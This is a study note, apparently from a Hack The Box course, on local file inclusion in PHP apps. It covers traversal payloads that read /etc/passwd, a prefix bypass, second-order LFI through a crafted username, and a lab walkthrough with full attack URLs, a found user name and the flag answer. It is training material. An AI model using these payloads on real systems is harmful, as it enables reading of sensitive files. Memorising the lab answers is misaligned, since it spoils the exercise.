---
tags: [CWES, HTB, technical-reference]
module: "File Inclusion"
source_file: "CWES.xmind"
---

# Basic LFI

> [!info] Complete technical reference
> Section imported without removing commands, hints, links, notes, or images.

## http://<SERVER_IP>:<PORT>/index.php?language=es.php

### language parameter

- It may be pulling the content from a different
  - database table
  - version of the web app
## common readable files

### Linux

- /etc/passwd
### Windows

- C:\Windows\boot.ini
## change the parameter from es to /etc/passwd

### root:x:..

## Path Traversal

### absolute path (e.g. /etc/passwd). This would work if the whole input was used within the include()

### include("./languages/" . $_GET['language']);

- relative paths
  - ../../../../etc/passwd
    - try to find the minimum number of ../
## Filename Prefix

### include("lang_" . $_GET['language']);

- the final string would be lang_../../../etc/passwd
  - error
    - we can prefix a / before our payload
      - index.php?language=/../../../etc/passwd
## Appended Extensions

### include($_GET['language'] . ".php");

- Try to read any php file (e.g. index.php)
## Second-Order Attacks

### web application may allow us to download our avatar through

- /profile/$username/avatar.png
  - we craft a malicious LFI username
    - ../../../etc/passwd
### but they may trust values pulled from their database, like our username

- they may protect against direct user input (e.g. from a ?page parameter)
## LAB

### Using the file inclusion find the name of a user on the system that starts with "b".

- change the language to spanish
  - http://154.57.164.69:31844/index.php?language=/../../../../../../etc/passwd
    - barry
### Submit the contents of the flag.txt file located in the /usr/share/flags directory.

- Submit the contents of the flag.txt file located in the /usr/share/flags directory.
  - http://154.57.164.69:31844/index.php?language=/../../../../../../usr/share/flags/flag.txt
    - HTB{n3v3r_tru$t_u$3r_!nput}
